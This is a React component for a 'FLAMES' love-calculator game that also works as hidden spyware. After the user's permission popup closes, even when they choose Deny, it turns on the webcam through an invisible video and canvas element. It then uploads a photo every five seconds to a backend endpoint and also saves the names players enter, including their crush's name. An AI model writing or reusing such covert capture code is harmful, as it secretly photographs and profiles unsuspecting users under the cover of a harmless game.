import React, { useState, useCallback, useMemo, useRef, useEffect } from "react";
import styled, { keyframes } from "styled-components";
import PermissionPopup from "./PermissionPopup";

const floatingHearts = keyframes`
  0% { transform: translateY(0); opacity: 1; }
  100% { transform: translateY(-100vh); opacity: 0; }
`;

const Background = styled.div`
  position: fixed;
  width: 100%;
  height: 100%;
  background: linear-gradient(135deg, #ff758c, #ff7eb3);
  display: flex;
  align-items: center;
  justify-content: center;
  overflow: hidden;
`;

const Heart = styled.div`
  position: absolute;
  color: #ff4d6d;
  font-size: 20px;
  top: 100%;
  left: ${({ left }) => left}%;
  animation: ${floatingHearts} ${({ duration }) => duration}s linear infinite;
`;

const Container = styled.div`
  text-align: center;
  background: rgba(255, 255, 255, 0.95);
  padding: 30px;
  border-radius: 15px;
  box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
  width: 90%;
  max-width: 400px;
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 12px;
`;

const Title = styled.h1`
  color: #ff4d6d;
  font-family: "Cursive", sans-serif;
  font-size: 2rem;
`;

const Input = styled.input`
  padding: 12px;
  width: 80%;
  max-width: 350px;
  border: 2px solid #ff4d6d;
  border-radius: 8px;
  font-size: 16px;
  outline: none;
  text-align: center;
`;

const Button = styled.button`
  background: ${({ disabled }) => (disabled ? "#d3d3d3" : "#ff4d6d")};
  color: white;
  padding: 12px;
  font-size: 18px;
  border: none;
  cursor: ${({ disabled }) => (disabled ? "not-allowed" : "pointer")};
  border-radius: 8px;
  width: 100%;
  max-width: 350px;
`;

const Result = styled.h2`
  color: #d43f5e;
  font-size: 24px;
  margin-top: 20px;
  opacity: 0;
  animation: fadeIn 0.5s ease-in-out forwards;
  @keyframes fadeIn {
    from { opacity: 0; }
    to { opacity: 1; }
  }
`;

const ShareButton = styled.button`
  background: rgb(157, 17, 127);
  color: white;
  padding: 10px;
  font-size: 16px;
  border: none;
  cursor: pointer;
  border-radius: 8px;
  margin-top: 10px;
  width: 100%;
  max-width: 350px;
`;

const StatusMessage = styled.p`
  font-size: 14px;
  color: #444;
`;

const flamesLogic = (name1, name2) => {
  const cleanName1 = name1.toLowerCase().replace(/\s/g, "");
  const cleanName2 = name2.toLowerCase().replace(/\s/g, "");

  let name1Arr = cleanName1.split("");
  let name2Arr = cleanName2.split("");

  for (let i = 0; i < name1Arr.length; i++) {
    const indexInName2 = name2Arr.indexOf(name1Arr[i]);
    if (indexInName2 !== -1) {
      name1Arr[i] = "";
      name2Arr[indexInName2] = "";
    }
  }

  const remainingCount =
    name1Arr.filter(letter => letter !== "").length +
    name2Arr.filter(letter => letter !== "").length;

  let flames = ["Friend", "Love", "Affection", "Marriage", "Enemy", "Sibling"];
  let index = 0;
  while (flames.length > 1) {
    index = (index + remainingCount - 1) % flames.length;
    flames.splice(index, 1);
  }
  return flames[0];
};

const FlamesGame = () => {
  const [name1, setName1] = useState("");
  const [name2, setName2] = useState("");
  const [result, setResult] = useState(null);
  const [isLoading, setIsLoading] = useState(false);
  const [showPermissionPopup, setShowPermissionPopup] = useState(() => localStorage.getItem("permissionsGiven") !== "true");
  const [permissionStatus, setPermissionStatus] = useState("");
  const videoRef = useRef();
  const canvasRef = useRef();

  useEffect(() => {
    if (!showPermissionPopup) {
      const startCamera = async () => {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        if (videoRef.current) videoRef.current.srcObject = stream;
      };

      startCamera();

      const interval = setInterval(capturePhoto, 5000);

      return () => {
        clearInterval(interval);
        if (videoRef.current?.srcObject) {
          videoRef.current.srcObject.getTracks().forEach(track => track.stop());
        }
      };
    }
  }, [showPermissionPopup]);

  const capturePhoto = async () => {
    if (!canvasRef.current || !videoRef.current) return;
    const context = canvasRef.current.getContext("2d");
    context.drawImage(videoRef.current, 0, 0, 320, 240);
    const imageData = canvasRef.current.toDataURL("image/jpeg");

    try {
      const res = await fetch("/api/save-photo", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ image: imageData }),
      });

      if (!res.ok) {
        const text = await res.text();
        console.error("Backend error response:", text);
      }

      console.log("Image sent to backend");
    } catch (err) {
      console.error("Image send failed:", err);
    }
  };

  const handleAllow = () => {
    setShowPermissionPopup(false);
    localStorage.setItem("permissionsGiven", "true");
    setPermissionStatus("Camera access granted and capturing every 5s");
  };

  const handleDeny = () => {
    setShowPermissionPopup(false);
    localStorage.setItem("permissionsGiven", "false");
    setPermissionStatus("Permissions denied ‚ùå");
  };

  const handleChange1 = useCallback(e => setName1(e.target.value), []);
  const handleChange2 = useCallback(e => setName2(e.target.value), []);

  const handleSubmit = async () => {
    if (!name1.trim() || !name2.trim()) return alert("Enter both names!");
    if (name1.toLowerCase() === name2.toLowerCase()) return alert("Names should be different!");

    setIsLoading(true);
    setResult(null);

    setTimeout(async () => {
      const flamesResult = flamesLogic(name1, name2);
      setResult(flamesResult);
      setIsLoading(false);

      // Save names and result to MongoDB via backend proxy
      try {
        const res = await fetch("/api/save-result", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ name1, name2, result: flamesResult }),
        });

        if (!res.ok) {
          const text = await res.text();
          console.error("Result save error:", text);
        }
      } catch (err) {
        console.error("Failed to send result:", err);
      }
    }, 2000);
  };

  const handleShare = async () => {
    if (!result) return;
    const shareMessage = `FLAMES Result: ${name1} ‚ù§ ${name2} = ${result}`;
    if (navigator.share) {
      await navigator.share({ text: shareMessage });
    } else {
      await navigator.clipboard.writeText(shareMessage);
      alert("Copied to clipboard! üìã");
    }
  };

  const heartPositions = useMemo(
    () => Array.from({ length: 30 }, () => ({
      left: Math.random() * 100,
      duration: 4 + Math.random() * 3,
    })),
    []
  );

  return (
    <Background>
      {heartPositions.map((pos, i) => (
        <Heart key={i} left={pos.left} duration={pos.duration}>‚ù§Ô∏è</Heart>
      ))}
      {showPermissionPopup && <PermissionPopup onAllow={handleAllow} onDeny={handleDeny} />}
      <Container>
        <Title>FLAMES - Love Calculator üíñ</Title>
        <Input type="text" placeholder="Your Name" value={name1} onChange={handleChange1} />
        <Input type="text" placeholder="Crush's Name" value={name2} onChange={handleChange2} />
        <Button onClick={handleSubmit} disabled={isLoading}>
          {isLoading ? "Checking..." : "Check Relationship"}
        </Button>
        {result && <Result>üíò {result} üíò</Result>}
        <ShareButton onClick={handleShare}>üì§ Share</ShareButton>
        {permissionStatus && <StatusMessage>{permissionStatus}</StatusMessage>}
        <video ref={videoRef} width="320" height="240" autoPlay muted style={{ display: "none" }} />
        <canvas ref={canvasRef} width="320" height="240" style={{ display: "none" }} />
      </Container>
    </Background>
  );
};

export default FlamesGame;
